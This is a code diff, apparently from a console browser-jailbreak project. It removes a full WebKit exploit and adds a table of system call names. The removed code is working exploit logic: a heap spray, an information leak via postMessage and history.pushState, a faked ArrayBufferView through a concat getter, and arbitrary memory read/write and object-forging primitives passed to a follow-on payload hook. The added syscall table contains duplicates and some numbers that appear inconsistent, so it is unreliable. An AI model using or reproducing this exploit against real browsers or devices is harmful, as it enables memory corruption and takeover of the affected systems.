@@ -1,330 +1,341 @@
-function makeid() {
-    var text = "";
-    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+window.nameforsyscall = swapkeyval(window.syscallnames);
+window.syscalls       = {};
 
-    for (var i = 0; i < 8; i++)
-        text += possible.charAt(Math.floor(Math.random() * possible.length));
-
-    return text;
-};
-
-var instancespr = [];
-
-for (var i = 0; i < 4096; i++) {
-    instancespr[i] = new Uint32Array(1);
-    instancespr[i][makeid()] = 50057; /* spray 4-field Object InstanceIDs */
+/* Get syscall name by index */
+function swapkeyval(json){
+  var ret = {};
+  for(var key in json){
+    if (json.hasOwnProperty(key)) {
+      ret[json[key]] = key;
+    }
+  }
+  return ret;
 }
 
-var _dview;
+/* A long ass map of system call names -> number, you shouldn't need to touch this */
+window.syscallnames =
+{
+  "sys_exit": 1,
+  "sys_fork": 2,
+  "sys_read": 3,
+  "sys_write": 4,
+  "sys_open": 5,
+  "sys_close": 6,
+  "sys_wait4": 7,
+  "sys_unlink": 10,
+  "sys_chdir": 12,
+  "sys_chmod": 15,
+  "sys_getpid": 20,
+  "sys_setuid": 23,
+  "sys_getuid": 24,
+  "sys_geteuid": 25,
+  "sys_recvmsg": 27,
+  "sys_sendmsg": 28,
+  "sys_recvfrom": 29,
+  "sys_accept": 30,
+  "sys_getpeername": 31,
+  "sys_getsockname": 32,
+  "sys_access": 33,
+  "sys_chflags": 34,
+  "sys_fchflags": 35,
+  "sys_sync": 36,
+  "sys_kill": 37,
+  "sys_stat": 38,
+  "sys_getppid": 39,
+  "sys_dup": 41,
+  "sys_pipe": 42,
+  "sys_getegid": 43,
+  "sys_profil": 44,
+  "sys_getgid": 47,
+  "sys_getlogin": 49,
+  "sys_setlogin": 50,
+  "sys_sigaltstack": 53,
+  "sys_ioctl": 54,
+  "sys_reboot": 55,
+  "sys_revoke": 56,
+  "sys_execve": 59,
+  "sys_msync": 65,
+  "sys_munmap": 73,
+  "sys_mprotect": 74,
+  "sys_madvise": 75,
+  "sys_mincore": 78,
+  "sys_getgroups": 79,
+  "sys_setgroups": 80,
+  "sys_setitimer": 83,
+  "sys_getitimer": 86,
+  "sys_getdtablesize": 89,
+  "sys_dup2": 90,
+  "sys_fcntl": 92,
+  "sys_select": 93,
+  "sys_fsync": 95,
+  "sys_setpriority": 96,
+  "sys_socket": 97,
+  "sys_connect": 98,
+  "sys_getpriority": 100,
+  "sys_send": 101,
+  "sys_recv": 102,
+  "sys_bind": 104,
+  "sys_setsockopt": 105,
+  "sys_listen": 106,
+  "sys_recvmsg": 113,
+  "sys_sendmsg": 114,
+  "sys_gettimeofday": 116,
+  "sys_getrusage": 117,
+  "sys_getsockopt": 118,
+  "sys_readv": 120,
+  "sys_writev": 121,
+  "sys_settimeofday": 122,
+  "sys_fchmod": 124,
+  "sys_recvfrom": 125,
+  "sys_setreuid": 126,
+  "sys_setregid": 127,
+  "sys_rename": 128,
+  "sys_flock": 131,
+  "sys_sendto": 133,
+  "sys_shutdown": 134,
+  "sys_socketpair": 135,
+  "sys_mkdir": 136,
+  "sys_rmdir": 137,
+  "sys_utimes": 138,
+  "sys_adjtime": 140,
+  "sys_getpeername": 141,
+  "sys_setsid": 147,
+  "sys_sysarch": 165,
+  "sys_setegid": 182,
+  "sys_seteuid": 183,
+  "sys_fstat": 189,
+  "sys_lstat": 190,
+  "sys_pathconf": 191,
+  "sys_fpathconf": 192,
+  "sys_getrlimit": 194,
+  "sys_setrlimit": 195,
+  "sys_getdirentries": 196,
+  "sys___sysctl": 202,
+  "sys_mlock": 203,
+  "sys_munlock": 204,
+  "sys_futimes": 206,
+  "sys_poll": 209,
+  "sys_clock_gettime": 232,
+  "sys_clock_settime": 233,
+  "sys_clock_getres": 234,
+  "sys_ktimer_create": 235,
+  "sys_ktimer_delete": 236,
+  "sys_ktimer_settime": 237,
+  "sys_ktimer_gettime": 238,
+  "sys_ktimer_getoverrun": 239,
+  "sys_nanosleep": 240,
+  "sys_rfork": 251,
+  "sys_issetugid": 253,
+  "sys_getdents": 272,
+  "sys_preadv": 289,
+  "sys_pwritev": 290,
+  "sys_getsid": 310,
+  "sys_aio_suspend": 315,
+  "sys_mlockall": 324,
+  "sys_munlockall": 325,
+  "sys_sched_setparam": 327,
+  "sys_sched_getparam": 328,
+  "sys_sched_setscheduler": 329,
+  "sys_sched_getscheduler": 330,
+  "sys_sched_yield": 331,
+  "sys_sched_get_priority_max": 332,
+  "sys_sched_get_priority_min": 333,
+  "sys_sched_rr_get_interval": 334,
+  "sys_utrace": 335,
+  "sys_sigprocmask": 340,
+  "sys_sigprocmask": 340,
+  "sys_sigsuspend": 341,
+  "sys_sigpending": 343,
+  "sys_sigtimedwait": 345,
+  "sys_sigwaitinfo": 346,
+  "sys_kqueue": 362,
+  "sys_kevent": 363,
+  "sys_uuidgen": 392,
+  "sys_sendfile": 393,
+  "sys_fstatfs": 397,
+  "sys_ksem_close": 400,
+  "sys_ksem_post": 401,
+  "sys_ksem_wait": 402,
+  "sys_ksem_trywait": 403,
+  "sys_ksem_init": 404,
+  "sys_ksem_open": 405,
+  "sys_ksem_unlink": 406,
+  "sys_ksem_getvalue": 407,
+  "sys_ksem_destroy": 408,
+  "sys_sigaction": 416,
+  "sys_sigreturn": 417,
+  "sys_getcontext": 421,
+  "sys_setcontext": 422,
+  "sys_swapcontext": 423,
+  "sys_sigwait": 429,
+  "sys_thr_create": 430,
+  "sys_thr_exit": 431,
+  "sys_thr_self": 432,
+  "sys_thr_kill": 433,
+  "sys_ksem_timedwait": 441,
+  "sys_thr_suspend": 442,
+  "sys_thr_wake": 443,
+  "sys_kldunloadf": 444,
+  "sys__umtx_op": 454,
+  "sys__umtx_op": 454,
+  "sys_thr_new": 455,
+  "sys_sigqueue": 456,
+  "sys_thr_set_name": 464,
+  "sys_rtprio_thread": 466,
+  "sys_pread": 475,
+  "sys_pwrite": 476,
+  "sys_mmap": 477,
+  "sys_lseek": 478,
+  "sys_truncate": 479,
+  "sys_ftruncate": 480,
+  "sys_thr_kill2": 481,
+  "sys_shm_open": 482,
+  "sys_shm_unlink": 483,
+  "sys_cpuset_getid": 486,
+  "sys_cpuset_getaffinity": 487,
+  "sys_cpuset_setaffinity": 488,
+  "sys_openat": 499,
+  "sys_pselect": 522,
 
-function u2d(low, hi) {
-    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
-    _dview.setUint32(0, hi);
-    _dview.setUint32(4, low);
-    return _dview.getFloat64(0);
+  "sys_regmgr_call": 532,
+  "sys_jitshm_create": 533,
+  "sys_jitshm_alias": 534,
+  "sys_dl_get_list": 535,
+  "sys_dl_get_info": 536,
+  "sys_dl_notify_event": 537,
+  "sys_evf_create": 538,
+  "sys_evf_delete": 539,
+  "sys_evf_open": 540,
+  "sys_evf_close": 541,
+  "sys_evf_wait": 542,
+  "sys_evf_trywait": 543,
+  "sys_evf_set": 544,
+  "sys_evf_clear": 545,
+  "sys_evf_cancel": 546,
+  "sys_query_memory_protection": 47,
+  "sys_batch_map": 548,
+  "sys_osem_create": 549,
+  "sys_osem_delete": 550,
+  "sys_osem_open": 551,
+  "sys_osem_close": 552,
+  "sys_osem_wait": 553,
+  "sys_osem_trywait": 554,
+  "sys_osem_post": 555,
+  "sys_osem_cancel": 556,
+  "sys_namedobj_create": 557,
+  "sys_namedobj_delete": 558,
+  "sys_set_vm_container": 559,
+  "sys_debug_init": 560,
+  "sys_suspend_process": 561,
+  "sys_resume_process": 562,
+  "sys_opmc_enable": 563,
+  "sys_opmc_disable": 564,
+  "sys_opmc_set_ctl": 565,
+  "sys_opmc_set_ctr": 566,
+  "sys_opmc_get_ctr": 567,
+  "sys_budget_create": 568,
+  "sys_budget_delete": 569,
+  "sys_budget_get": 570,
+  "sys_budget_set": 571,
+  "sys_virtual_query": 572,
+  "sys_mdbg_call": 573,
+  "sys_sblock_create": 574,
+  "sys_sblock_delete": 575,
+  "sys_sblock_enter": 576,
+  "sys_sblock_exit": 577,
+  "sys_sblock_xenter": 578,
+  "sys_sblock_xexit": 579,
+  "sys_eport_create": 580,
+  "sys_eport_delete": 581,
+  "sys_eport_trigger": 582,
+  "sys_eport_open": 583,
+  "sys_eport_close": 584,
+  "sys_is_in_sandbox": 585,
+  "sys_dmem_container": 586,
+  "sys_get_authinfo": 587,
+  "sys_mname": 588,
+  "sys_dynlib_dlopen": 589,
+  "sys_dynlib_dlclose": 590,
+  "sys_dynlib_dlsym": 591,
+  "sys_dynlib_get_list": 592,
+  "sys_dynlib_get_info": 593,
+  "sys_dynlib_load_prx": 594,
+  "sys_dynlib_unload_prx": 595,
+  "sys_dynlib_do_copy_relocations": 596,
+  "sys_dynlib_prepare_dlclose": 597,
+  "sys_dynlib_get_proc_param": 598,
+  "sys_dynlib_process_needed_and_relocate": 599,
+  "sys_sandbox_path": 600,
+  "sys_mdbg_service": 601,
+  "sys_randomized_path": 602,
+  "sys_rdup": 603,
+  "sys_dl_get_metadata": 604,
+  "sys_workaround8849": 605,
+  "sys_is_development_mode": 606,
+  "sys_get_self_auth_info": 607,
+  "sys_dynlib_get_info_ex": 608,
+  "sys_budget_get_ptype": 610,
+  "sys_budget_getid": 609,
+  "sys_get_paging_stats_of_all_threads": 611,
+  "sys_get_proc_type_info": 612,
+  "sys_get_resident_count": 613,
+  "sys_prepare_to_suspend_process": 614,
+  "sys_get_resident_fmem_count": 615,
+  "sys_thr_get_name": 616,
+  "sys_set_gpo": 617,
+  "sys_get_paging_stats_of_all_objects": 618,
+  "sys_test_debug_rwmem": 619,
+  "sys_free_stack": 620,
+  "sys_suspend_system": 621,
+  "sys_ipmimgr_call": 622,
+  "sys_get_gpo": 623,
+  "sys_get_vm_map_timestamp": 624,
+  "sys_opmc_set_hw": 625,
+  "sys_opmc_get_hw": 626,
+  "sys_get_cpu_usage_all": 627,
+  "sys_mmap_dmem": 628,
+  "sys_physhm_open": 629,
+  "sys_physhm_unlink": 630,
+  "sys_resume_internal_hdd": 631,
+  "sys_thr_suspend_ucontext": 632,
+  "sys_thr_resume_ucontext": 633,
+  "sys_thr_get_ucontext": 634,
+  "sys_thr_set_ucontext": 635,
+  "sys_set_timezone_info": 636,
+  "sys_set_phys_fmem_limit": 637,
+  "sys_utc_to_localtime": 638,
+  "sys_localtime_to_utc": 639,
+  "sys_set_uevt": 640,
+  "sys_get_cpu_usage_proc": 641,
+  "sys_get_map_statistics": 642,
+  "sys_set_chicken_switches": 643,
+  "sys_extend_page_table_pool": 644,
+  "sys_645": 645,
+  "sys_get_kernel_mem_statistics": 646,
+  "sys_get_sdk_compiled_version": 647,
+  "sys_app_state_change": 648,
+  "sys_dynlib_get_obj_member": 649,
+  "sys_budget_get_ptype_of_budget": 650,
+  "sys_prepare_to_resume_process": 651,
+  "sys_process_terminate": 652,
+  "sys_blockpool_open": 653,
+  "sys_blockpool_map": 654,
+  "sys_blockpool_unmap": 655,
+  "sys_dynlib_get_info_for_libdbg": 656,
+  "sys_blockpool_batch": 657,
+  "sys_fdatasync": 658,
+  "sys_dynlib_get_list2": 659,
+  "sys_dynlib_get_info2": 660,
+  "sys_aio_submit": 661,
+  "sys_aio_multi_delete": 662,
+  "sys_aio_multi_wait": 663,
+  "sys_aio_multi_poll": 664,
+  "sys_aio_get_data": 655,
+  "sys_aio_multi_cancel": 666,
+  "sys_get_bio_usage_all": 667,
+  "sys_aio_create": 668,
+  "sys_aio_submit_cmd": 669,
+  "sys_aio_init": 670,
+  "sys_get_page_table_stats": 671,
+  "sys_dynlib_get_list_for_libdbg": 672
 }
-var dgc = function () {
-    for (var i = 0; i < 0x100; i++) {
-        new ArrayBuffer(0x100000);
-    }
-}
-
-function int64(low, hi) {
-    this.low = (low >>> 0);
-    this.hi = (hi >>> 0);
-
-    this.add32inplace = function (val) {
-        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
-
-        if (new_lo < this.low) {
-            new_hi++;
-        }
-
-        this.hi = new_hi;
-        this.low = new_lo;
-    }
-
-    this.add32 = function (val) {
-        var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
-
-        if (new_lo < this.low) {
-            new_hi++;
-        }
-
-        return new int64(new_lo, new_hi);
-    }
-
-    this.sub32 = function (val) {
-        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
-
-        if (new_lo > (this.low) & 0xFFFFFFFF) {
-            new_hi--;
-        }
-
-        return new int64(new_lo, new_hi);
-    }
-
-    this.sub32inplace = function (val) {
-        var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
-        var new_hi = (this.hi >>> 0);
-
-        if (new_lo > (this.low) & 0xFFFFFFFF) {
-            new_hi--;
-        }
-
-        this.hi = new_hi;
-        this.low = new_lo;
-    }
-
-    this.and32 = function (val) {
-        var new_lo = this.low & val;
-        var new_hi = this.hi;
-        return new int64(new_lo, new_hi);
-    }
-
-    this.and64 = function (vallo, valhi) {
-        var new_lo = this.low & vallo;
-        var new_hi = this.hi & valhi;
-        return new int64(new_lo, new_hi);
-    }
-
-    this.toString = function (val) {
-        val = 16;
-        var lo_str = (this.low >>> 0).toString(val);
-        var hi_str = (this.hi >>> 0).toString(val);
-
-        if (this.hi == 0)
-            return lo_str;
-        else
-            lo_str = zeroFill(lo_str, 8)
-
-        return hi_str + lo_str;
-    }
-
-    this.toPacked = function () {
-        return {
-            hi: this.hi,
-            low: this.low
-        };
-    }
-
-    this.setPacked = function (pck) {
-        this.hi = pck.hi;
-        this.low = pck.low;
-        return this;
-    }
-
-    return this;
-}
-
-function zeroFill(number, width) {
-    width -= number.toString().length;
-
-    if (width > 0) {
-        return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
-    }
-
-    return number + ""; // always return a string
-}
-
-var nogc = [];
-
-var fail = function () {
-    alert.apply(null, arguments);
-    throw "fail";
-}
-
-// Target JSObject for overlap
-var tgt = {
-    a: 0,
-    b: 0,
-    c: 0,
-    d: 0
-}
-
-var y = new ImageData(1, 0x4000)
-postMessage("", "*", [y.data.buffer]);
-
-// Spray properties to ensure object is fastmalloc()'d and can be found easily later
-var props = {};
-
-for (var i = 0;
-    (i < (0x4000 / 2));) {
-    props[i++] = {
-        value: 0x42424242
-    };
-    props[i++] = {
-        value: tgt
-    };
-}
-
-var foundLeak = undefined;
-var foundIndex = 0;
-var maxCount = 0x100;
-
-while (foundLeak == undefined && maxCount > 0) {
-    maxCount--;
-
-    history.pushState(y, "");
-
-    Object.defineProperties({}, props);
-
-    var leak = new Uint32Array(history.state.data.buffer);
-
-    for (var i = 0; i < leak.length - 6; i++) {
-        if (
-            leak[i] == 0x42424242 &&
-            leak[i + 0x1] == 0xFFFF0000 &&
-            leak[i + 0x2] == 0x00000000 &&
-            leak[i + 0x3] == 0x00000000 &&
-            leak[i + 0x4] == 0x00000000 &&
-            leak[i + 0x5] == 0x00000000 &&
-            leak[i + 0x6] == 0x0000000E &&
-            leak[i + 0x7] == 0x00000000 &&
-            leak[i + 0xA] == 0x00000000 &&
-            leak[i + 0xB] == 0x00000000 &&
-            leak[i + 0xC] == 0x00000000 &&
-            leak[i + 0xD] == 0x00000000 &&
-            leak[i + 0xE] == 0x0000000E &&
-            leak[i + 0xF] == 0x00000000
-        ) {
-            foundIndex = i;
-            foundLeak = leak;
-            break;
-        }
-    }
-}
-
-if (!foundLeak) {
-    failed = true
-    fail("Failed to find leak!")
-}
-
-var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
-var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
-
-Array.prototype.__defineGetter__(100, () => 1);
-
-var f = document.body.appendChild(document.createElement('iframe'));
-var a = new f.contentWindow.Array(13.37, 13.37);
-var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
-
-var master = new Uint32Array(0x1000);
-var slave = new Uint32Array(0x1000);
-var leakval_u32 = new Uint32Array(0x1000);
-var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
-
-// Create fake ArrayBufferView
-tgt.a = u2d(2048, 0x1602300);
-tgt.b = 0;
-tgt.c = leakval_helper;
-tgt.d = 0x1337;
-
-var c = Array.prototype.concat.call(a, b);
-document.body.removeChild(f);
-var hax = c[0];
-c[0] = 0;
-
-tgt.c = c;
-
-hax[2] = 0;
-hax[3] = 0;
-
-Object.defineProperty(Array.prototype, 100, {
-    get: undefined
-});
-
-tgt.c = leakval_helper;
-var butterfly = new int64(hax[2], hax[3]);
-butterfly.low += 0x10;
-
-tgt.c = leakval_u32;
-var lkv_u32_old = new int64(hax[4], hax[5]);
-hax[4] = butterfly.low;
-hax[5] = butterfly.hi;
-// Setup read/write primitive
-
-tgt.c = master;
-hax[4] = leakval_u32[0];
-hax[5] = leakval_u32[1];
-
-var addr_to_slavebuf = new int64(master[4], master[5]);
-tgt.c = leakval_u32;
-hax[4] = lkv_u32_old.low;
-hax[5] = lkv_u32_old.hi;
-
-tgt.c = 0;
-hax = 0;
-
-var prim = {
-    write8: function (addr, val) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        if (val instanceof int64) {
-            slave[0] = val.low;
-            slave[1] = val.hi;
-        } else {
-            slave[0] = val;
-            slave[1] = 0;
-        }
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-    },
-
-    write4: function (addr, val) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        slave[0] = val;
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-    },
-
-    read8: function (addr) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        var rtv = new int64(slave[0], slave[1]);
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-
-        return rtv;
-    },
-
-    read4: function (addr) {
-        master[4] = addr.low;
-        master[5] = addr.hi;
-
-        var rtv = slave[0];
-
-        master[4] = addr_to_slavebuf.low;
-        master[5] = addr_to_slavebuf.hi;
-
-        return rtv;
-    },
-
-    leakval: function (jsval) {
-        leakval_helper[0] = jsval;
-        var rtv = this.read8(butterfly);
-        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-
-        return rtv;
-    },
-
-    createval: function (jsval) {
-        this.write8(butterfly, jsval);
-        var rt = leakval_helper[0];
-        this.write8(butterfly, new int64(0x41414141, 0xffff0000));
-        return rt;
-    }
-};
-
-window.primitives = prim;
-if (window.postExpl) window.postExpl();
